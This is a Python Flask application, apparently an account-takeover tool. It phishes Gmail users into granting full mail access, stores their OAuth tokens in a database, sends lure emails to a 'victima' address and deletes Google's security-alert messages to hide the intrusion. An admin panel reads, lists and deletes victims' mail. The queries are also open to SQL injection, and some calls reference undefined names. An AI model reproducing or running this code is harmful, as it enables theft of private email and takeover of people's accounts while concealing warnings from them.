import json
import os
import MySQLdb
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart 
from email.mime.image import MIMEImage
import flask
import httplib2
from apiclient import discovery
from oauth2client import client
import base64
from apiclient import errors

DB_HOST = 'localhost' 
DB_USER = 'root' 
DB_PASS = '' 
DB_NAME = 'pg' 
app = flask.Flask(__name__)
def run_query(query=''): 
    datos = [DB_HOST, DB_USER, DB_PASS, DB_NAME] 
 
    conn = MySQLdb.connect(*datos)  #Abriendo Conexion 
    cursor = conn.cursor()         
    cursor.execute(query)          
 
    if query.upper().startswith('SELECT'): 
        data = cursor.fetchall()   
    else: 
        conn.commit()               
        data = None 
 
    cursor.close()                 
    conn.close()
    return data   

@app.route('/')
def index():
  if 'credentials' not in flask.session:
    return flask.redirect(flask.url_for('oauth2callback'))
  credentials = client.OAuth2Credentials.from_json()
  if credentials.access_token_expired:
    return flask.redirect(flask.url_for('oauth2callback'))
  else:
    http_auth = credentials.authorize(httplib2.Http())
    service = discovery.build('gmail', 'v1',http=http_auth)
    mensajes = GetMensaje(service,'me')
    EliminarMensaje(service,mensajes[0]['id'])   #Elimina Solo el ultimo Mensaje 
    return "Mensajes Eliminados"


@app.route('/eliminar',methods=['GET'])
def delete():
  identificador = flask.request.args.get('id') # ID en la DB
  res = run_query("SELECT Tokens from datos Where 'id'="+identificador)
  token  = json.loads(res[0][0])
  credentials = client.OAuth2Credentials.from_json(token)
  http_auth = credentials.authorize(httplib2.Http())
  service = discovery.build('gmail', 'v1',http=http_auth)
  mensajes = GetMensaje(service,'me')
  EliminarMensaje(service,mensajes[0]['id'])   #Elimina Solo el ultimo Mensaje 
  return "Hecho"


def GetMensaje(service, user_id, query='from:no-reply@accounts.google.com'):

  response = service.users().messages().list(userId=user_id,q=query).execute()
  messages = []
  if 'messages' in response:
    messages.extend(response['messages'])

  while 'nextPageToken' in response:
    page_token = response['nextPageToken']
    response = service.users().messages().list(userId=user_id, q=query,pageToken=page_token).execute()
    messages.extend(response['messages'])
  return messages

def EliminarMensaje(service,msg_id):
  try:
    service.users().messages().delete(userId='me', id=msg_id).execute()
  except:
    print("Error Al elimnar mensaje")

               # Cerrar la conexión 
 
  
@app.route('/oauth2callback')
def oauth2callback():
  flow = client.flow_from_clientsecrets(
      'client_secret.json',
      scope='https://mail.google.com/',
      redirect_uri='http://URL/oauth2callback')
  flow.params['include_granted_scopes'] = 'true'
  flow.params['access_type'] = 'offline'
  flow.params['approval_prompt'] = 'force'
  if 'code' not in flask.request.args:
    auth_uri = flow.step1_get_authorize_url()
    return flask.redirect(auth_uri)
  else:
    auth_code = flask.request.args.get('code')  #Se busca el codigo de autorizacion 
    credentials = flow.step2_exchange(auth_code) 
    http_auth = credentials.authorize(httplib2.Http())
    service = discovery.build('gmail', 'v1',http=http_auth)
    response = service.users().getProfile(userId='me').execute() #  Ya con las quedenciales se pide el perfil 
    mail = response['emailAddress']  # Obtiene el email para identificar a la victima 
    sq = "INSERT INTO Datos (id,email,Tokens) VALUES (null,'%s','%s')"  % (mail,credentials.to_json()) 
    res = run_query(sq)#Insercion en la base de datos 
    return "Hecho s"

@app.route('/geturl')
def geturl():
  flow = client.flow_from_clientsecrets(
      'client_secret.json',
      scope='https://mail.google.com/',
      redirect_uri='http://URL/oauth2callback')
  flow.params['include_granted_scopes'] = 'true'
  flow.params['access_type'] = 'offline'
  flow.params['approval_prompt'] = 'force'
  auth_uri = flow.step1_get_authorize_url()
  return auth_uri


@app.route('/resfescar',methods=['GET'])
def refresco():
  tokenR = request.args.get('tokenRefresco') #Token de refresco 
  identificador = request.args.get('id') # ID en la DB
  flow = client.flow_from_clientsecrets(
      'client_secret.json',
      scope='https://mail.google.com/',
      redirect_uri='http://URL/oauth2callback')
  flow.params['include_granted_scopes'] = 'true'
  flow.params['access_type'] = 'offline'
  flow.params['approval_prompt'] = 'force'
  credentials = flow.step2_exchange(tokenR)   #.....   Funcion Para refrescar Tokens ..... 
  query = "UPDATE Datos SET Tokens='%s' WHERE id = %i" % (credentials.to_json(), int(identificador)) 
  run_query(query)
  return "Hecho"

@app.route('/envio')
def SendEmail():
 
  remitente = "***" 
  destinatario = "****@gmail.com" 
  asunto = "E-mal HTML enviado desde Python" 
  mensaje = """Hola!<br/> <br/> 
Este es un <b>e-mail</b> enviando desde <b>Python</b> 
"""
 
  email = """From: %s 
To: %s 
MIME-Version: 1.0 
Content-type: text/html 
Subject: %s 
 
%s
""" % (remitente, destinatario, asunto, mensaje) 
  try: 
      smtp = smtplib.SMTP('smptserver',2525)
      mailServer.ehlo()
      mailServer.starttls()
      mailServer.ehlo()     
      smtp.login("uss","pass")
      #smtp.sendmail(remitente, destinatario, email) 
      print ("Correo enviado") 
  except: 
      print ("""Error: el mensaje no pudo enviarse. 
      Compruebe que sendmail se encuentra instalado en su sistema""")
  return "holamundo"

@app.route('/envio2',methods=['GET']) #envio con plantilla html 
def  senddos():

  username = '***'
  password = '**'
  primerParte = open ('plantilla.html','r')
  m1 = primerParte.read()
  segundaParte = open('plantilla2.html','r')
  m2 = segundaParte.read()
  msg = MIMEMultipart('mixed')
  sender = 'jorgePromos@gmail.com'
  recipient = request.args.get('victima')
  msg['Subject'] = 'Enhorabuena  '
  msg['From'] = sender
  msg['To'] = recipient
  link = "LINK "
  final = m1 +   link  + m2
  html_message = MIMEText(final, 'html')
  msg.attach(html_message)
  mailServer = smtplib.SMTP('smpy server', 2525) # 8025, 587 and 25 can also be used. 
  mailServer.ehlo()
  mailServer.starttls()
  mailServer.ehlo()
  mailServer.login(username, password)
  mailServer.sendmail(sender, recipient, msg.as_string())
  mailServer.close()
  return final

@app.route('/Admin')
def  Admin():
  sql = "SELECT id,email,Tokens from datos"
  re = run_query(sql)
  result = ""
  if re != None:
    for x in range(0,len(re)):
      token  = json.loads(re[x][2])
      cor = """<a href="/correo?id="""+str(re[x][0])+""" "><button class="btn btn-primary">Ver Correo</button></a>   """
      Eliminar = """<a href="/eliminar?id="""+str(re[x][0])+""" "><button class="btn btn-primary">Eliminar Correo</button></a>   """
      result += "<tr><td>"+re[x][1]+"</td><td>0</td><td>"+token["token_expiry"]+"</td><td>"+Eliminar+"</td> <td>"+cor+"</td> <td><a href=\"/refrescar?tokenRefresco="+token["refresh_token"]+"&&id="+str(re[x][0])+"\"><button class='btn btn-success'>Refresco</button></a></td></tr>"
  html = """
  <html>
  <head>
    <title>Administrador</title>
    <!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
  </head>
  <body>
  <h2 class="sub-header"> Administracion De tokens </h2>
    <table class="table table-striped">
      <tr>
        <td>Email</td><td>Status</td><td>Vencimiento</td><td>Eliminar Correo de Advertencia</td><td>Ver Correo</td><td>Refescar y Acceder</td>"""+result+"""
      </tr>
    <table>
  </body>
  </html>
  """
  return html 
def getCredenciales(idn):
  sql = "SELECT Tokens from datos Where id="+idn
  res = run_query(sql)
  token  = json.loads(res[0][0])
  credentials = client.OAuth2Credentials.from_json(res[0][0])
  return credentials



@app.route('/correo',methods=['GET'])
def  correo():
  html = ""
  iden = flask.request.args.get("id")
  credentials = getCredenciales(iden)
  http_auth = credentials.authorize(httplib2.Http())
  service = discovery.build('gmail', 'v1',http=http_auth)
  label_ids = ["CATEGORY_PERSONAL"]
  response = service.users().messages().list(userId='me',labelIds=label_ids,maxResults=15).execute()
  messages = []
  messages.extend(response['messages'])
  tmsg = ""
  for x in range(0,len(messages)):
     message = service.users().messages().get(userId='me', id=messages[x]['id']).execute()
     bottonBorrar = "<a href='/BorrarMensaje?idc="+str(messages[x]['id'])+"&&id="+iden+"'><button class='btn btn-primary'>Eliminar</button>"
     tmsg += "<tr><td>"+message['snippet']+"</td><td><a href='/mostrarMail?idc="+str(messages[x]['id'])+"&&id="+iden+"'><button class='btn btn-primary'>Abrir</button></a></td><td>"+bottonBorrar+"</td></tr>"
  html = """
  <html>
  <head>
    <title>Administrador</title>
    <!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
  </head>
  <body>
  <h2 class="sub-header"> Administracion De Correos </h2>
    <table class="table table-striped">
      <tr>
        <td>Snippet</td><td>Ver</td><td>Eliminar</td>"""+tmsg+"""
      </tr>
    <table>
  </body>
  </html>
  """
  return html



@app.route('/mostrarMail')
def mostrar():
  iden = flask.request.args.get("id")
  msg_id =flask.request.args.get("idc")
  credentials = getCredenciales(iden)
  http_auth = credentials.authorize(httplib2.Http())
  service = discovery.build('gmail', 'v1',http=http_auth)
  message = service.users().messages().get(userId='me', id=msg_id,format='raw').execute()
  msg_str = base64.urlsafe_b64decode(message['raw'].encode('ASCII'))
  return msg_str
@app.route('/BorrarMensaje')
def eli():
  iden = flask.request.args.get("id")
  idm = flask.request.args.get("idm")
  msg_id =flask.request.args.get("idc")
  credentials = getCredenciales(iden)
  http_auth = credentials.authorize(httplib2.Http())
  service = discovery.build('gmail', 'v1',http=http_auth)
  EliminarMensaje(service,idm)
  return  "ok"

if __name__ == '__main__':
  import uuid
  app.secret_key = str(uuid.uuid4())
  app.debug = True 
  app.run()




